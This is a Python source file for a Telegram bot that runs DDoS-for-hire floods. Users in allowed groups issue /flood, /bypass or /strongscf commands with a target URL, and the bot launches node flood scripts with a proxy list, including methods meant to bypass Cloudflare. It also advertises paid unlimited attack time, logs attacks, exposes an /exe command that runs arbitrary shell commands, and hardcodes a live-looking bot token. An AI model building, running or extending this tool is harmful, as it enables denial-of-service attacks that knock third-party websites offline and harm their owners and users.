import asyncio
import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse
from datetime import datetime, timedelta  # Th√™m timedelta v√†o ƒë√¢y
import json
import time
import pytz

ALLOWED_USER_ID = 7371969470  # ID c·ªßa admin m·∫∑c ƒë·ªãnh
TOKEN = '7918986015:AAG1XUBnLpc1TJrdHWoT1ph2meDeQt2zbPY'   # Token c·ªßa bot Telegram
GROUPS_FILE, HISTORY_FILE, ADMINS_FILE = "allowed_groups.json", "attack_history.json", "admins.json"
task_info = {}  # Th√¥ng tin ti·∫øn tr√¨nh t·∫•n c√¥ng
bot_status = True  # Tr·∫°ng th√°i c·ªßa bot, m·∫∑c ƒë·ªãnh l√† b·∫≠t

# Load v√† l∆∞u d·ªØ li·ªáu JSON
def load_json(file, default_value=None):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return default_value if default_value else []

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

# Ki·ªÉm tra n·∫øu ng∆∞·ªùi d√πng l√† admin
def is_admin(user_id):
    admins = load_json(ADMINS_FILE, [])
    return user_id == ALLOWED_USER_ID or user_id in admins

# Ki·ªÉm tra tr·∫°ng th√°i c·ªßa bot
def is_bot_on():
    return bot_status


# L·ªánh t·∫•n c√¥ng
async def run_attack(url, attack_time, update, method, context):
    if not is_bot_on():
        return await update.message.reply_text("‚ùå Bot hi·ªán t·∫°i ƒëang b·ªã t·∫Øt, kh√¥ng th·ªÉ th·ª±c hi·ªán.")
    
    user_id = update.effective_user.id
    heap_size = "--max-old-space-size=32768"
    commands = {
        'STRONGS-CF': f"node {heap_size} strongsflood.js {url} {attack_time} 10 10 live.txt",
        'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 20 20 live.txt bypass",
        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 20 20 live.txt flood"
    }

    command = commands.get(method)
    if not command:
        return await update.message.reply_text("‚ùå Ph∆∞∆°ng th·ª©c kh√¥ng h·ª£p l·ªá.")

    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    task_info.setdefault(user_id, []).append({
        "url": url, "method": method, "remaining_time": attack_time,
        "task_id": process.pid, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S"),
        "message": None
    })

    # L∆∞u l·ªãch s·ª≠ t·∫•n c√¥ng
    history = load_json(HISTORY_FILE)
    history.append({"user_id": user_id, "username": update.effective_user.username, "url": url, "method": method, "attack_time": attack_time, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S")})
    save_json(HISTORY_FILE, history)

    # Th√¥ng b√°o ngay l·∫≠p t·ª©c v√†o nh√≥m
    group_chat_id = update.message.chat.id
    attack_result = f"üö® ATTACK {url} ƒë√£ b·∫Øt ƒë·∫ßu.\nPh∆∞∆°ng th·ª©c: {method}\nTh·ªùi gian: {attack_time} gi√¢y\n\nüí¨ Ng∆∞·ªùi d√πng @{update.effective_user.username} üí• Ki·ªÉm tra tin nh·∫Øn ƒë·∫øn t·ª´ bot ƒë·ªÉ theo d√µi k·∫øt qu·∫£ chi ti·∫øt üìù."
    await context.bot.send_message(group_chat_id, attack_result)

    async def update_remaining_time():
        start_time = time.time()
        end_time = start_time + attack_time
        while time.time() < end_time:
            remaining_time = max(0, int(end_time - time.time()))
            task_text = f"üî¥ Ti·∫øn tr√¨nh:\nURL: {url}, Ph∆∞∆°ng th·ª©c: {method}\n‚è≥ Th·ªùi gian c√≤n l·∫°i: {remaining_time} gi√¢y\n\nüîó Ki·ªÉm tra t√¨nh tr·∫°ng HOST: [Click here](https://check-host.net/check-http?host=https://{parse.urlsplit(url).netloc})"

            # G·ª≠i th√¥ng b√°o ri√™ng cho ng∆∞·ªùi d√πng m·ªói 5 gi√¢y
            if user_id in task_info and task_info[user_id]:
                # N·∫øu ƒë√£ c√≥ tin nh·∫Øn tr∆∞·ªõc ƒë√≥, x√≥a n√≥ ƒëi
                if task_info[user_id][0]["message"]:
                    try:
                        # X√≥a tin nh·∫Øn c≈© tr∆∞·ªõc khi g·ª≠i tin nh·∫Øn m·ªõi
                        await task_info[user_id][0]["message"].delete()
                    except Exception as e:
                        print(f"Error deleting message: {e}")  # Handle any errors that might occur while deleting a message

                # G·ª≠i tin nh·∫Øn m·ªõi
                task_info[user_id][0]["message"] = await update.effective_user.send_message(task_text, parse_mode='Markdown')

            await asyncio.sleep(5)  # Ch·ªù 5 gi√¢y tr∆∞·ªõc khi g·ª≠i tin nh·∫Øn ti·∫øp theo

    # T·∫°o t√°c v·ª• c·∫≠p nh·∫≠t th·ªùi gian c√≤n l·∫°i
    asyncio.create_task(update_remaining_time())
    await asyncio.sleep(attack_time)

    # Th√¥ng b√°o k·∫øt th√∫c t·∫•n c√¥ng cho ng∆∞·ªùi d√πng
    await update.effective_user.send_message(f"Attack {method} URL {url} Successfully. ‚úÖ")

# L∆∞u tr·ªØ th·ªùi gian cu·ªëi c√πng ng∆∞·ªùi d√πng th·ª±c hi·ªán l·ªánh
user_last_command_time = {}

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Ki·ªÉm tra tr·∫°ng th√°i bot
    if not is_bot_on():
        return await update.message.reply_text("‚ùå Bot hi·ªán t·∫°i ƒëang b·ªã t·∫Øt, kh√¥ng th·ªÉ th·ª±c hi·ªán.")
    
    # Ki·ªÉm tra quy·ªÅn c·ªßa ng∆∞·ªùi d√πng
    if update.message.chat.id not in load_json(GROUPS_FILE) and not is_admin(user_id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng t√≠nh nƒÉng n√†y. Mu·ªën build server bot ri√™ng ho·∫∑c m·ªü kh√¥ng gi·ªõi h·∫°n slot time, li√™n h·ªá @NeganSSHConsole.")

    # Ki·ªÉm tra th·ªùi gian gi·ªØa c√°c l·∫ßn th·ª±c thi l·ªánh, ch·ªâ √°p d·ª•ng cho ng∆∞·ªùi kh√¥ng ph·∫£i admin
    if not is_admin(user_id):  # N·∫øu ng∆∞·ªùi d√πng kh√¥ng ph·∫£i admin
        current_time = time.time()  # Th·ªùi gian hi·ªán t·∫°i (t√≠nh b·∫±ng gi√¢y)
        last_time = user_last_command_time.get(user_id, 0)  # Th·ªùi gian th·ª±c hi·ªán l·ªánh cu·ªëi c√πng c·ªßa ng∆∞·ªùi d√πng

        if current_time - last_time < 60:
            remaining_time = 60 - (current_time - last_time)
            # G·ª≠i tin nh·∫Øn ri√™ng cho ng∆∞·ªùi y√™u c·∫ßu v·ªÅ th·ªùi gian ch·ªù
            return await update.message.reply_text(f"‚ùå @{update.effective_user.username}, b·∫°n c·∫ßn ch·ªù th√™m {int(remaining_time)} gi√¢y n·ªØa m·ªõi c√≥ th·ªÉ th·ª±c hi·ªán l·ªánh ti·∫øp theo.")

        # L∆∞u l·∫°i th·ªùi gian th·ª±c hi·ªán l·ªánh hi·ªán t·∫°i (ng∆∞·ªùi d√πng c√≥ th·ªÉ th·ª±c hi·ªán l·ªánh)
        user_last_command_time[user_id] = current_time

    # Ki·ªÉm tra c√∫ ph√°p l·ªánh
    if len(context.args) < 2:
        return await help_command(update, context)

    try:
        url, attack_time = context.args[0], int(context.args[1])
        method = 'STRONGS-CF' if '/strongscf' in update.message.text else ('bypass' if '/bypass' in update.message.text else 'flood')

        # Ki·ªÉm tra th·ªùi gian t·∫•n c√¥ng
        if attack_time > 60 and not is_admin(update.effective_user.id):
            return await update.message.reply_text("‚ö†Ô∏è Th·ªùi gian t·ªëi ƒëa l√† 60 gi√¢y.")
        
        # Th·ª±c hi·ªán t·∫•n c√¥ng
        asyncio.create_task(run_attack(url, attack_time, update, method, context))

    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå ƒê√£ x·∫£y ra l·ªói.")


# L·ªãch s·ª≠ t·∫•n c√¥ng
async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    history = load_json(HISTORY_FILE)
    current_time = datetime.now(pytz.timezone("Asia/Ho_Chi_Minh"))
    time_limit = current_time - timedelta(minutes=60)  # Th·ªùi gian gi·ªõi h·∫°n: 60 ph√∫t tr∆∞·ªõc

    # L·ªçc ra c√°c b·∫£n ghi trong v√≤ng 60 ph√∫t qua
    filtered_history = [
        entry for entry in history 
        if datetime.strptime(entry['start_time'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=pytz.timezone("Asia/Ho_Chi_Minh")) >= time_limit
    ]
    
    if not filtered_history:
        return await update.message.reply_text("‚ùå Kh√¥ng c√≥ l·ªãch s·ª≠ t·∫•n c√¥ng trong 60 ph√∫t qua.")

    # T·∫°o n·ªôi dung l·ªãch s·ª≠
    history_text = "üìù L·ªãch s·ª≠ trong 60 ph√∫t qua:\n"
    for entry in filtered_history:
        history_text += f"üí• URL: {entry['url']}\n‚öî Ph∆∞∆°ng th·ª©c: {entry['method']}\nüë§ Ng∆∞·ªùi d√πng: @{entry['username']}\n‚è± Th·ªùi gian: {entry['start_time']}\n‚è≥ Th·ªùi gian: {entry['attack_time']} gi√¢y\n\n"
    
    # Chia nh·ªè tin nh·∫Øn n·∫øu n√≥ qu√° d√†i
    max_message_length = 4096
    while len(history_text) > max_message_length:
        # C·∫Øt tin nh·∫Øn th√†nh c√°c ph·∫ßn nh·ªè
        await update.message.reply_text(history_text[:max_message_length], parse_mode='Markdown')
        history_text = history_text[max_message_length:]
    
    # G·ª≠i ph·∫ßn c√≤n l·∫°i n·∫øu c√≥
    if history_text:
        await update.message.reply_text(history_text, parse_mode='Markdown')



# D·ª´ng ti·∫øn tr√¨nh t·∫•n c√¥ng
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    subprocess.run("ps aux | grep 'tls-kill.js\\|strongsflood.js' | grep -v grep | awk '{print $2}' | xargs kill -9", shell=True)
    await update.message.reply_text("‚úÖ Ti·∫øn tr√¨nh tls-kill.js : strongsflood.js ƒë√£ d·ª´ng.")

# Th√™m nh√≥m v√†o danh s√°ch nh√≥m ƒë∆∞·ª£c ph√©p
async def add_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    try:
        group_id = int(context.args[0])
        allowed_groups = load_json(GROUPS_FILE)
        if group_id in allowed_groups:
            return await update.message.reply_text("‚ùå Nh√≥m n√†y ƒë√£ c√≥ trong danh s√°ch.")
        
        allowed_groups.append(group_id)
        save_json(GROUPS_FILE, allowed_groups)
        await update.message.reply_text(f"‚úÖ Nh√≥m {group_id} ƒë√£ ƒë∆∞·ª£c th√™m v√†o danh s√°ch nh√≥m ƒë∆∞·ª£c ph√©p.")
    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå Vui l√≤ng cung c·∫•p ID nh√≥m h·ª£p l·ªá.")

# Th√™m ng∆∞·ªùi d√πng admin v√†o danh s√°ch
async def add_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    try:
        new_admin_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if new_admin_id in admins:
            return await update.message.reply_text("‚ùå Ng∆∞·ªùi d√πng n√†y ƒë√£ l√† admin.")
        
        admins.append(new_admin_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"‚úÖ Ng∆∞·ªùi d√πng {new_admin_id} ƒë√£ ƒë∆∞·ª£c th√™m v√†o danh s√°ch admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå Vui l√≤ng cung c·∫•p ID ng∆∞·ªùi d√πng h·ª£p l·ªá.")

# X√≥a ng∆∞·ªùi d√πng admin
async def delete_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    try:
        user_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if user_id not in admins:
            return await update.message.reply_text("‚ùå Ng∆∞·ªùi d√πng n√†y kh√¥ng ph·∫£i l√† admin.")
        
        admins.remove(user_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"‚úÖ Ng∆∞·ªùi d√πng {user_id} ƒë√£ ƒë∆∞·ª£c x√≥a kh·ªèi danh s√°ch admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå Vui l√≤ng cung c·∫•p ID ng∆∞·ªùi d√πng h·ª£p l·ªá.")

# X√≥a to√†n b·ªô l·ªãch s·ª≠ t·∫•n c√¥ng
async def delete_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    save_json(HISTORY_FILE, [])
    await update.message.reply_text("‚úÖ To√†n b·ªô l·ªãch s·ª≠  ƒë√£ ƒë∆∞·ª£c x√≥a.")

# L·ªánh b·∫≠t bot
async def on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    global bot_status
    bot_status = True
    await update.message.reply_text("‚úÖ Bot ƒë√£ ƒë∆∞·ª£c b·∫≠t.")

# L·ªánh t·∫Øt bot
async def off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    global bot_status
    bot_status = False
    await update.message.reply_text("‚ùå Bot ƒë√£ b·ªã t·∫Øt.")


# H√†m x·ª≠ l√Ω l·ªánh /exe
async def exe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Ki·ªÉm tra xem ng∆∞·ªùi d√πng c√≥ ph·∫£i l√† admin m·∫∑c ƒë·ªãnh ALLOWED_USER_ID kh√¥ng
    if update.effective_user.id != ALLOWED_USER_ID:
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")  # Ch·ªâ admin ALLOWED_USER_ID m·ªõi ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh

    # Ki·ªÉm tra c√∫ ph√°p l·ªánh: ph·∫£i c√≥ √≠t nh·∫•t m·ªôt tham s·ªë (l·ªánh terminal)
    if len(context.args) < 1:
        return await update.message.reply_text("‚ùå Vui l√≤ng cung c·∫•p l·ªánh terminal c·∫ßn th·ª±c thi.")  # N·∫øu thi·∫øu tham s·ªë, th√¥ng b√°o l·ªói
    
    command = " ".join(context.args)  # K·∫øt h·ª£p c√°c tham s·ªë th√†nh m·ªôt l·ªánh

    try:
        # Th·ª±c thi l·ªánh terminal v√† l·∫•y k·∫øt qu·∫£
        result = subprocess.run(command, shell=True, text=True, capture_output=True)  # Th·ª±c thi l·ªánh, b·∫Øt k·∫øt qu·∫£ ƒë·∫ßu ra
        
        # G·ª≠i k·∫øt qu·∫£ cho ng∆∞·ªùi d√πng
        output = result.stdout if result.stdout else "L·ªánh th·ª±c thi th√†nh c√¥ng nh∆∞ng kh√¥ng c√≥ k·∫øt qu·∫£."  # N·∫øu c√≥ k·∫øt qu·∫£, g·ª≠i n√≥, n·∫øu kh√¥ng th√¨ th√¥ng b√°o th√†nh c√¥ng
        await update.message.reply_text(f"‚öôÔ∏è K·∫øt qu·∫£ l·ªánh:\n```\n{output}\n```", parse_mode='Markdown')  # G·ª≠i k·∫øt qu·∫£ d∆∞·ªõi d·∫°ng markdown

    except Exception as e:
        await update.message.reply_text(f"‚ùå ƒê√£ x·∫£y ra l·ªói: {str(e)}")  # N·∫øu c√≥ l·ªói, g·ª≠i th√¥ng b√°o l·ªói


    

# L·ªánh gi√∫p ƒë·ª°
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
üåê Bot Commands:

### User Commands:
- ‚úÖ /flood https://google.com 60 - Flood attack for 60 seconds.
- ‚úÖ /bypass https://google.com 60 - Bypass attack for 60 seconds.
- ‚ùå /strongscf https://google.com 60 - STRONGS-CF attack for 60 seconds.
- /help - Show command guide.

### Admin Commands:
- /stop - Stop the attack.
- /addgroup [group_id] - Add group.
- /history - View attack history.
- /adduser [user_id] - Add admin.
- /deleteuser [user_id] - Remove admin.
- /deletehistory - Delete attack history.
- /exe [command] - Execute terminal command.
- /on - Activate bot.
- /off - Deactivate bot.
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')


# Kh·ªüi ch·∫°y bot
def main():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("bypass", attack))
    application.add_handler(CommandHandler("strongscf", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("addgroup", add_group))
    application.add_handler(CommandHandler("adduser", add_user_admin))
    application.add_handler(CommandHandler("deleteuser", delete_user_admin))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("history", history))
    application.add_handler(CommandHandler("deletehistory", delete_history))
    application.add_handler(CommandHandler("on", on))
    application.add_handler(CommandHandler("off", off))
    application.add_handler(CommandHandler("exe", exe_command))
    application.run_polling()

if __name__ == "__main__":
    main()
